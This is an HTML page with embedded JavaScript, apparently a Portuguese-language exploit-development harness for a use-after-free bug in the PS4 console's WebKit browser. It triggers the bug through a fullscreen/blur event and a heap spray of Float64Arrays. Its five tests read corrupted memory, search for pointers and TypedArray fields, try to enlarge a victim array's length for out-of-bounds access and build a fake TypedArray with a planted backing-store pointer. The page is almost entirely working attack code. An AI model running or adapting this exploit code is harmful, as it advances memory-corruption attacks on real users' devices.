<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - An√°lise NaN e Estruturas JSC</title>
<style>
body { 
    font-family: monospace; 
    background: #000; 
    color: #0f0; 
    padding: 20px;
}
.test-box {
    border: 2px solid #0a0;
    padding: 15px;
    margin: 10px 0;
    background: #001100;
}
.success { background: #003300 !important; border-color: #0f0 !important; }
.critical { background: #003366 !important; border-color: #00f !important; color: #0ff; }
button {
    background: #0a0;
    color: #000;
    border: none;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
    margin: 5px;
}
button:hover { background: #0f0; }
.hex { color: #ff0; font-weight: bold; }
.addr { color: #0ff; font-weight: bold; }
pre { 
    background: #001100; 
    border: 1px solid #0a0; 
    padding: 10px; 
    overflow-x: auto;
}
</style>
</head>
<body>

<h1>üî¨ An√°lise Avan√ßada - Padr√£o NaN e JSC</h1>
<div style="background: #330033; border: 2px solid #f0f; padding: 15px; margin: 20px 0;">
    <h2>‚ö†Ô∏è DESCOBERTA IMPORTANTE</h2>
    <p>O valor <span class="hex">0x7ff8000000000000</span> √© <b>NaN can√¥nico</b>!<br>
    Isso pode indicar dados n√£o inicializados OU acesso a estruturas JSC adjacentes.</p>
</div>

<div class="test-box">
    <h2>TESTE 11: Mapeamento Completo do Array Corrompido</h2>
    <p>Mapeia TODOS os valores do offset 0 at√© onde for poss√≠vel ler</p>
    <button onclick="runTest11()">‚ñ∂ Executar Mapeamento</button>
    <div id="result1"></div>
</div>

<div class="test-box">
    <h2>TESTE 12: Inje√ß√£o de Valores √önicos</h2>
    <p>Injeta valores espec√≠ficos nos offsets 0-7 e verifica propaga√ß√£o</p>
    <button onclick="runTest12()">‚ñ∂ Executar Inje√ß√£o</button>
    <div id="result2"></div>
</div>

<div class="test-box">
    <h2>TESTE 13: Busca por Estruturas TypedArray</h2>
    <p>Procura por campos conhecidos de Float64Array (length, byteOffset, etc)</p>
    <button onclick="runTest13()">‚ñ∂ Buscar Estruturas</button>
    <div id="result3"></div>
</div>

<div class="test-box">
    <h2>TESTE 14: Manipula√ß√£o Seletiva dos Offsets</h2>
    <p>Tenta modificar offsets espec√≠ficos para identificar campos control√°veis</p>
    <button onclick="runTest14()">‚ñ∂ Testar Manipula√ß√£o</button>
    <div id="result4"></div>
</div>

<div class="test-box">
    <h2>TESTE 15: Constru√ß√£o de Fake TypedArray</h2>
    <p>Tenta criar um TypedArray falso com length expandido para OOB</p>
    <button onclick="runTest15()">‚ñ∂ Criar Fake Array</button>
    <div id="result5"></div>
</div>

<script>
// Utilit√°rios
function f2i(f) {
    let buf = new ArrayBuffer(8);
    let fview = new Float64Array(buf);
    let iview = new BigUint64Array(buf);
    fview[0] = f;
    return iview[0];
}

function i2f(i) {
    let buf = new ArrayBuffer(8);
    let fview = new Float64Array(buf);
    let iview = new BigUint64Array(buf);
    iview[0] = BigInt(i);
    return fview[0];
}

function hex(n) {
    return '0x' + n.toString(16).padStart(16, '0');
}

const PATTERN_A = 2.121995791e-314; // 0x4141414141414141
const NaN_CANONICAL = 0x7ff8000000000000n;

let corrupted_array = null;

function setupUAF(callback) {
    let controllers = [];
    
    for(let i = 0; i < 10000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 15000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN_A);
            spray.push(p);
        }
        
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN_A) {
                corrupted_array = controllers[i];
                break;
            }
        }
        
        callback(corrupted_array, spray, controllers);
    };
}

// ============================================
// TESTE 11: MAPEAMENTO COMPLETO
// ============================================
function runTest11() {
    const box = document.getElementById('test-box');
    const result = document.getElementById('result1');
    result.innerHTML = 'Preparando... Aperte OPTIONS!<br>';
    
    setupUAF((corrupted, spray, controllers) => {
        if (!corrupted) {
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML = '<h3>üìä MAPA COMPLETO DA MEM√ìRIA CORROMPIDA</h3>';
        result.innerHTML += '<pre style="max-height: 500px; overflow-y: scroll;">';
        
        let regions = {
            pattern_a: [],
            nan_values: [],
            zeros: [],
            other: []
        };
        
        // Tentar ler at√© 256 offsets
        for(let i = 0; i < 256; i++) {
            try {
                const val = corrupted[i];
                const as_int = f2i(val);
                
                if (val === PATTERN_A) {
                    regions.pattern_a.push(i);
                    result.innerHTML += `[${String(i).padStart(3, ' ')}] <span class="hex">${hex(as_int)}</span> ‚Üê PATTERN A\n`;
                } else if (as_int === NaN_CANONICAL) {
                    regions.nan_values.push(i);
                    result.innerHTML += `[${String(i).padStart(3, ' ')}] <span class="hex">${hex(as_int)}</span> ‚Üê NaN\n`;
                } else if (val === 0) {
                    regions.zeros.push(i);
                    result.innerHTML += `[${String(i).padStart(3, ' ')}] 0x0000000000000000 ‚Üê Zero\n`;
                } else {
                    regions.other.push({offset: i, value: as_int});
                    result.innerHTML += `[${String(i).padStart(3, ' ')}] <span class="addr">${hex(as_int)}</span> ‚Üê INTERESSANTE!\n`;
                }
            } catch(e) {
                result.innerHTML += `[${String(i).padStart(3, ' ')}] ??? (erro ao ler)\n`;
                break; // Para se n√£o conseguir mais ler
            }
        }
        
        result.innerHTML += '</pre>';
        
        result.innerHTML += '<h3>üìà RESUMO:</h3>';
        result.innerHTML += `<b>Pattern A:</b> ${regions.pattern_a.length} offsets (${regions.pattern_a.slice(0,5).join(', ')}${regions.pattern_a.length > 5 ? '...' : ''})<br>`;
        result.innerHTML += `<b>NaN:</b> ${regions.nan_values.length} offsets (${regions.nan_values.slice(0,5).join(', ')}${regions.nan_values.length > 5 ? '...' : ''})<br>`;
        result.innerHTML += `<b>Zeros:</b> ${regions.zeros.length} offsets<br>`;
        result.innerHTML += `<b>Outros valores:</b> ${regions.other.length} offsets<br>`;
        
        if (regions.other.length > 0) {
            result.innerHTML += '<br><b>üéØ VALORES CR√çTICOS:</b><br>';
            regions.other.forEach(v => {
                result.innerHTML += `  Offset ${v.offset}: <span class="addr">${hex(v.value)}</span><br>`;
            });
        }
        
        result.innerHTML += '<br><b>üí° AN√ÅLISE:</b><br>';
        if (regions.pattern_a.length === 8) {
            result.innerHTML += '‚úÖ Offsets 0-7 s√£o completamente control√°veis (64 bytes)<br>';
        }
        if (regions.nan_values.length > 20) {
            result.innerHTML += '‚ö†Ô∏è Grande quantidade de NaN sugere leitura OOB ou heap n√£o inicializado<br>';
        }
        if (regions.other.length > 0) {
            result.innerHTML += `üéØ ${regions.other.length} valores an√¥malos podem ser ponteiros JSC!<br>`;
        }
    });
}

// ============================================
// TESTE 12: INJE√á√ÉO DE VALORES √öNICOS
// ============================================
function runTest12() {
    const result = document.getElementById('result2');
    result.innerHTML = 'Preparando inje√ß√£o... Aperte OPTIONS!<br>';
    
    setupUAF((corrupted, spray) => {
        if (!corrupted) {
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML = '<h3>üíâ TESTE DE INJE√á√ÉO DE VALORES</h3>';
        
        // Tentar injetar valores √∫nicos nos offsets 0-7
        const test_values = [
            i2f(0x1111111111111111n),
            i2f(0x2222222222222222n),
            i2f(0x3333333333333333n),
            i2f(0x4444444444444444n),
            i2f(0x5555555555555555n),
            i2f(0x6666666666666666n),
            i2f(0x7777777777777777n),
            i2f(0x8888888888888888n)
        ];
        
        result.innerHTML += '<b>Injetando valores:</b><br>';
        for(let i = 0; i < 8; i++) {
            try {
                corrupted[i] = test_values[i];
                result.innerHTML += `  [${i}] = ${hex(f2i(test_values[i]))} ... `;
                
                // Verificar se foi escrito corretamente
                const readback = corrupted[i];
                if (readback === test_values[i]) {
                    result.innerHTML += '<span style="color:#0f0;">‚úì OK</span><br>';
                } else {
                    result.innerHTML += `<span style="color:#f00;">‚úó Leu: ${hex(f2i(readback))}</span><br>`;
                }
            } catch(e) {
                result.innerHTML += `<span style="color:#f00;">‚úó Erro: ${e}</span><br>`;
            }
        }
        
        result.innerHTML += '<br><b>Verificando propaga√ß√£o al√©m do offset 7:</b><br>';
        for(let i = 8; i < 20; i++) {
            try {
                const val = corrupted[i];
                const as_int = f2i(val);
                
                if (as_int !== NaN_CANONICAL && val !== 0) {
                    result.innerHTML += `  [${i}] = <span class="addr">${hex(as_int)}</span> ‚Üê MUDOU!\br>`;
                }
            } catch(e) {}
        }
        
        result.innerHTML += '<br><b>üí° CONCLUS√ÉO:</b><br>';
        result.innerHTML += 'Se os offsets 0-7 foram escritos corretamente, voc√™ tem controle total!<br>';
        result.innerHTML += 'Se valores apareceram nos offsets 8+, h√° estruturas adjacentes sendo afetadas.<br>';
    });
}

// ============================================
// TESTE 13: BUSCA POR ESTRUTURAS TYPEDARRAY
// ============================================
function runTest13() {
    const result = document.getElementById('result3');
    result.innerHTML = 'Procurando estruturas... Aperte OPTIONS!<br>';
    
    setupUAF((corrupted, spray) => {
        if (!corrupted) {
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML = '<h3>üîç BUSCA POR CAMPOS DE TYPEDARRAY</h3>';
        result.innerHTML += '<p>Estrutura esperada de Float64Array no WebKit:</p>';
        result.innerHTML += '<pre>+0x00: JSCell header (vtable ptr)\n';
        result.innerHTML += '+0x08: Butterfly pointer\n';
        result.innerHTML += '+0x10: length (como JSValue)\n';
        result.innerHTML += '+0x18: byteOffset\n';
        result.innerHTML += '+0x20: vector (backing store pointer)</pre>';
        
        result.innerHTML += '<br><b>Analisando regi√£o corrompida:</b><br>';
        
        let candidates = {
            possible_lengths: [],
            possible_pointers: [],
            possible_vtable: []
        };
        
        for(let i = 0; i < 32; i++) {
            try {
                const val = corrupted[i];
                const as_int = f2i(val);
                
                // Length geralmente √© um inteiro pequeno (< 10000)
                if (as_int > 0n && as_int < 10000n) {
                    candidates.possible_lengths.push({offset: i, value: as_int});
                }
                
                // Ponteiros geralmente est√£o no range de user-space
                if (as_int > 0x100000n && as_int < 0x7fffffffffffn) {
                    const is_aligned = (as_int & 0xfn) === 0n;
                    candidates.possible_pointers.push({
                        offset: i, 
                        value: as_int,
                        aligned: is_aligned
                    });
                }
                
                // Vtable pointers geralmente apontam para regi√µes de c√≥digo
                if (as_int > 0x1000000n && as_int < 0x100000000n) {
                    candidates.possible_vtable.push({offset: i, value: as_int});
                }
            } catch(e) {}
        }
        
        result.innerHTML += `<b>Lengths candidatos:</b> ${candidates.possible_lengths.length}<br>`;
        candidates.possible_lengths.forEach(c => {
            result.innerHTML += `  Offset ${c.offset}: ${c.value}<br>`;
        });
        
        result.innerHTML += `<br><b>Ponteiros candidatos:</b> ${candidates.possible_pointers.length}<br>`;
        candidates.possible_pointers.slice(0, 10).forEach(c => {
            const marker = c.aligned ? ' ‚Üê ALINHADO!' : '';
            result.innerHTML += `  Offset ${c.offset}: <span class="addr">${hex(c.value)}</span>${marker}<br>`;
        });
        
        if (candidates.possible_vtable.length > 0) {
            result.innerHTML += `<br><b>Poss√≠veis vtables:</b> ${candidates.possible_vtable.length}<br>`;
            candidates.possible_vtable.forEach(c => {
                result.innerHTML += `  Offset ${c.offset}: <span class="hex">${hex(c.value)}</span><br>`;
            });
        }
        
        if (candidates.possible_pointers.length > 0) {
            result.innerHTML += '<br><b>üéØ A√á√ÉO:</b> Use o TESTE 14 para tentar modificar esses ponteiros!<br>';
        }
    });
}

// ============================================
// TESTE 14: MANIPULA√á√ÉO SELETIVA
// ============================================
function runTest14() {
    const result = document.getElementById('result4');
    result.innerHTML = 'Preparando manipula√ß√£o... Aperte OPTIONS!<br>';
    
    setupUAF((corrupted, spray) => {
        if (!corrupted) {
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML = '<h3>üîß TESTE DE MANIPULA√á√ÉO SELETIVA</h3>';
        
        // Criar um ArrayBuffer v√≠tima para tentar modificar
        let victim = new Float64Array(16);
        for(let i = 0; i < 16; i++) victim[i] = i * 1.1;
        
        result.innerHTML += 'V√≠tima criada: Float64Array[16]<br>';
        result.innerHTML += `Valores iniciais: [${Array.from(victim).slice(0,4).map(v => v.toFixed(1)).join(', ')}...]<br><br>`;
        
        result.innerHTML += '<b>Tentando modificar offsets espec√≠ficos:</b><br>';
        
        // Testar modifica√ß√£o de offsets cr√≠ticos
        const test_offsets = [8, 10, 12, 16, 20];
        const HUGE_LENGTH = i2f(0x10000n); // 65536 elementos
        
        for(let offset of test_offsets) {
            try {
                // Salvar valor original
                const original = corrupted[offset];
                
                // Tentar injetar um length grande
                corrupted[offset] = HUGE_LENGTH;
                
                result.innerHTML += `  Offset ${offset}: ${hex(f2i(original))} ‚Üí ${hex(f2i(HUGE_LENGTH))}`;
                
                // Verificar se a v√≠tima foi afetada
                if (victim.length > 16) {
                    result.innerHTML += ` <span style="color:#0f0; font-weight:bold;">‚úì V√çTIMA EXPANDIDA!</span><br>`;
                    result.innerHTML += `  Nova length: ${victim.length}<br>`;
                    result.innerHTML += '<br><b>üéØ SUCESSO CR√çTICO!</b><br>';
                    result.innerHTML += `Voc√™ pode agora ler/escrever al√©m do array v√≠tima!<br>`;
                    result.innerHTML += `Offset m√°gico: ${offset}<br>`;
                    return;
                } else {
                    result.innerHTML += ' (sem efeito)<br>';
                }
                
                // Restaurar valor
                corrupted[offset] = original;
            } catch(e) {
                result.innerHTML += ` ‚úó Erro<br>`;
            }
        }
        
        result.innerHTML += '<br>‚ö†Ô∏è Nenhum offset afetou a v√≠tima diretamente.<br>';
        result.innerHTML += 'üí° Tente criar mais v√≠timas ou ajustar o heap spray.<br>';
    });
}

// ============================================
// TESTE 15: CONSTRU√á√ÉO DE FAKE TYPEDARRAY
// ============================================
function runTest15() {
    const result = document.getElementById('result5');
    result.innerHTML = 'Construindo fake array... Aperte OPTIONS!<br>';
    
    setupUAF((corrupted, spray, controllers) => {
        if (!corrupted) {
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML = '<h3>üèóÔ∏è CONSTRU√á√ÉO DE FAKE TYPEDARRAY</h3>';
        result.innerHTML += '<p>Tentando criar um TypedArray falso com length arbitr√°rio...</p>';
        
        // Criar um array real para servir de template
        let template = new Float64Array(8);
        
        result.innerHTML += '<b>Analisando template real:</b><br>';
        result.innerHTML += `Template length: ${template.length}<br>`;
        result.innerHTML += `Template byteLength: ${template.byteLength}<br><br>`;
        
        // Tentar construir estrutura falsa nos offsets 0-7
        result.innerHTML += '<b>Construindo estrutura falsa:</b><br>';
        
        try {
            // Offset 0-1: Pode ser JSCell header (tentativa)
            // Offset 2: Length (como JSValue tagged integer)
            const FAKE_LENGTH = 0x10000; // 65536 elementos = 512KB
            corrupted[2] = i2f(BigInt(FAKE_LENGTH));
            
            result.innerHTML += `  [2] Length injetado: ${FAKE_LENGTH}<br>`;
            
            // Offset 3-4: Outros campos (byteOffset, etc)
            corrupted[3] = 0; // byteOffset = 0
            
            // Offset 5: Backing store pointer (apontar para regi√£o controlada)
            // Por enquanto, usar um valor de teste
            corrupted[5] = i2f(0x4142434445464748n);
            
            result.innerHTML += `  [5] Backing store: ${hex(0x4142434445464748n)}<br>`;
            
            result.innerHTML += '<br><b>Estrutura injetada:</b><br>';
            result.innerHTML += '<pre>';
            for(let i = 0; i < 8; i++) {
                const val = corrupted[i];
                result.innerHTML += `[${i}] ${hex(f2i(val))}\n`;
            }
            result.innerHTML += '</pre>';
            
            result.innerHTML += '<br><b>‚ö†Ô∏è PR√ìXIMO PASSO:</b><br>';
            result.innerHTML += 'Para ativar este fake array, voc√™ precisa:<br>';
            result.innerHTML += '1. Usar fakeobj() para criar uma refer√™ncia JS a este objeto<br>';
            result.innerHTML += '2. Ou encontrar uma forma de substituir um array real por este<br>';
            result.innerHTML += '<br>üí° Isso requer primitivas addrof/fakeobj completas.<br>';
            
        } catch(e) {
            result.innerHTML += `<br>‚ùå Erro ao construir: ${e}<br>`;
        }
    });
}

</script>

<hr>
<p style="color: #888;">
<b>AN√ÅLISE DO VALOR 0x7ff8000000000000:</b><br>
‚Ä¢ Esse √© NaN can√¥nico (Not a Number) em IEEE 754<br>
‚Ä¢ Aparece massivamente nos offsets 8-63<br>
‚Ä¢ Pode indicar: (1) Heap n√£o inicializado, (2) Dados de spray, (3) Estruturas JSC<br>
‚Ä¢ O fato de aparecer DEPOIS do offset 7 √© significativo!<br>
</p>

</body>
</html>
